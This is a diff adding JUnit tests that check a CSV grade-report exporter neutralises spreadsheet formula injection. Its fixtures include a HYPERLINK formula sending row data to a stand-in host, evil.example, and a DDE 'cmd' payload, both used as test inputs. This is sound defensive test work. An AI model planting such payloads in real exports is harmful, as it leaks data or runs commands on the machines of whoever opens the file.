@@ -97,6 +97,43 @@ class ReportExporterTest {
 		assertThat(student.get("submissionCount").asLong()).isZero();
 	}
 
+	@Test
+	void neutralisesASpreadsheetFormulaInAStudentSuppliedName() {
+		// Registration is open to anyone and puts no character restriction on a name, so
+		// this is what a student can put in the instructor's spreadsheet. Opening the
+		// export - which is what an export is for - evaluates it: HYPERLINK and
+		// WEBSERVICE reach the network with the row's contents, and DDE has reached the
+		// shell. RFC quoting is not a defence, because the spreadsheet strips the quotes
+		// and then reads the leading '='. The cell has to arrive as the text it is.
+		CourseReport report = report("=HYPERLINK(\"https://evil.example/?d=\"&A2,\"Grades\")");
+
+		String csv = new String(new CsvReportExporter().export(report), StandardCharsets.UTF_8);
+
+		assertThat(csv).doesNotContain(",=HYPERLINK").doesNotContain(",\"=HYPERLINK");
+		assertThat(csv).contains("HYPERLINK");
+	}
+
+	@Test
+	void neutralisesEveryCharacterASpreadsheetTreatsAsAFormula() {
+		for (String lead : List.of("=", "+", "-", "@", "\t", "\r")) {
+			String csv = new String(new CsvReportExporter().export(report(lead + "cmd|'/c calc'!A0")),
+					StandardCharsets.UTF_8);
+
+			assertThat(csv).as("a cell may not begin with %s", lead)
+				.doesNotContain("," + lead)
+				.doesNotContain(",\"" + lead);
+		}
+	}
+
+	@Test
+	void leavesAnOrdinaryNameAlone() {
+		// The guard must not reach names that were never dangerous, or every exported
+		// spreadsheet acquires punctuation nobody typed.
+		String csv = new String(new CsvReportExporter().export(report("Ada Lovelace")), StandardCharsets.UTF_8);
+
+		assertThat(csv).contains(",Ada Lovelace,");
+	}
+
 	private static CourseReport report(String fullName) {
 		StudentProgressRow row = new StudentProgressRow(STUDENT_ID, "s1", fullName, 1, 0, 0, BigDecimal.ONE,
 				BigDecimal.TEN, BigDecimal.ONE, BigDecimal.TEN, 1, CLOCK.instant(), Map.of());
